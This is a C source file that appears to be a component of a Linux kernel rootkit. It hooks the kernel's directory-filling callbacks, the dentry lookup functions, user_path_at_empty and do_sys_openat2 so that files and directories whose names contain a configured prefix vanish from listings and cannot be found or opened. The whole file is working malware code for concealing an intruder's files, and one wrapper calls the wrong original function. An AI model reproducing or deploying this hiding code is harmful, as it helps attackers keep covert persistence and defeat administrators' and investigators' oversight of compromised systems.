#ifdef CONFIG_HIDE_DIR_AND_FILES
#include "../header_files/utils.h"
#include <linux/fs.h>


typedef int (*t_dir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
static t_dir orig_fillonedir;
static t_dir orig_filldir;
static t_dir orig_filldir64;
static t_dir orig_compat_fillonedir;
static t_dir orig_compat_filldir;

static int rk_fillonedir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENAMETOOLONG;
	if (!strstr(name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden)
		ret = orig_fillonedir(ctx, name, namlen, offset, ino, d_type);
	return ret;
}

static int rk_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENAMETOOLONG;
	if (!strstr(name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden)
		ret = orig_filldir(ctx, name, namlen, offset, ino, d_type);
	return ret;
}

static int rk_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENAMETOOLONG;
	if (!strstr(name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden)
		ret = orig_filldir64(ctx, name, namlen, offset, ino, d_type);
	return ret;
}

static int rk_compat_fillonedir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENAMETOOLONG;
	if (!strstr(name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden)
		ret = orig_compat_filldir(ctx, name, namlen, offset, ino, d_type);
	return ret;
}

static int rk_compat_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENAMETOOLONG;
	if (!strstr(name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden)
		ret = orig_compat_filldir(ctx, name, namlen, offset, ino, d_type);
	return ret;
}


#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
struct dentry * (*orig_d_lookup)(const struct dentry *parent, const struct qstr *name);
struct dentry *rk_d_lookup(const struct dentry *parent, const struct qstr *name)
#else
struct dentry *(*orig_d_lookup)(struct dentry *parent, struct qstr *name);
struct dentry *rk_d_lookup(struct dentry *parent, struct qstr *name)
#endif
{
	struct dentry *found = NULL;
	if (!strstr(name->name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden)
		found = orig_d_lookup(parent, name);
	return found;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
struct dentry *(*orig___d_lookup)(const struct dentry *parent, const struct qstr *name);
struct dentry *rk___d_lookup(const struct dentry *parent, const struct qstr *name)
#else
struct dentry *(*orig___d_lookup)(struct dentry *parent, struct qstr *name);
struct dentry *rk___d_lookup(struct dentry *parent, struct qstr *name)
#endif
{
	struct dentry *found = NULL;
	if (!strstr(name->name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden)
		found = orig___d_lookup(parent, name);
	return found;
}

//  hook user_path_at_empty which is wrapped by user_path_at and use in access, chroot, chdir etc.. syscall
int (*orig_user_path_at_empty)(int dfd, const char __user *name, unsigned flags, struct path *path, int *empty);

int rk_user_path_at_empty(int dfd, const char __user *name, unsigned flags, struct path *path, int *empty) {
	int ret = -ENOENT;
	if (!strstr(name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden)
		ret = orig_user_path_at_empty(dfd, name, flags, path, empty);
	return ret;

}

/*
struct dir_context rk_ctx = {
    .actor = rk_filldir,
};


int (*orig_iterate_dir)(struct file *file, struct dir_context *ctx);
int rk_iterate_dir(struct file *file, struct dir_context *ctx) {
	if (!strstr(file->f_path.dentry->d_name.name, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !hidden) {
		ctx = &rk_ctx;
	}
	ret = orig_iterate_dir(file, ctx);
	return ret;
}
*/


/*
int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return result;
}

*/


#endif


#ifdef CONFIG_NO_OPEN_HIDDEN
#include "../header_files/utils.h"
/* --------------------- FILE ACCESS --------------------- */
// hook do_sys_openat2 use in open syscall,

static long (*orig_do_sys_openat2)(int dfd, const char __user *filename, struct open_how *how);

static long rk_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how) {
	int ret = -ETXTBSY;
	if (!strstr(filename, CONFIG_HIDE_FILE_AND_DIR_PREFIX) || !no_open)
		ret = orig_do_sys_openat2(dfd, filename, how);
	return ret;
}

#endif